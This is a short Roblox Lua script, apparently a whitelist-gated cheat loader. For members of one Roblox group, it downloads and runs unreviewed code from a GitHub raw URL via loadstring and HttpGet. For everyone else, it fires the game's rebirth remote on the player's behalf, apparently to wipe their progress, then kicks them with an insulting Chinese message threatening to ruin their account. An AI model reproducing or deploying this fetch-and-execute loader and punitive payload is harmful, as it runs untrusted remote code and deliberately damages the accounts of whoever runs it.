local an = game:GetService("Players").LocalPlayer
local group = 35633654
local grouplink = "https://www.roblox.com/communities/35633654/unnamed#!/about"

if an:IsInGroup(group) then
print("成功")
loadstring(game:HttpGet("https://raw.githubusercontent.com/Anscripterato/scriptui/refs/heads/main/hello.lua"))()
else
game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")	
wait(3)
game.Players.LocalPlayer:Kick("傻逼东西还想直接绕过白名单是不是，给你号毁了，不谢😂😂😂")
end